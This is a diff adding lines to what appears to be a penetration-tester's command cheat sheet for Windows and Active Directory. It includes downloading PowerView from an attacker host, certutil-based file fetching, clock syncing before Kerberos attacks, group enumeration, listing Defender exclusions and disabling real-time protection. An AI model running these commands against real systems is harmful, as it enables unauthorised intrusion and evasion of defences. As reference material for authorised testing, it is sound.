@@ -5,6 +5,10 @@ Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView
 curl -o example.txt http://example.com/file.txt
 
 certutil.exe -urlcache -split -f http://<ip>/file file_save
+
+timedatectl set-ntp 0
+
+ntpdate $IP
 ```
 
 Get Processes
@@ -62,6 +66,8 @@ echo %hostname%
 Local users
 ```powershell
 net users
+
+Get-ADUser <username> -Properties MemberOf
 ```
 
 Domain users
@@ -110,6 +116,9 @@ Do you have admin privs?
 Disable Windows Defender real time monitoring
 ```powershell
 Get-MpComputerStatus
+
+# List excluded directories
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 
 Set-MpPreference -DisableRealTimeMonitoring $true	
 ```
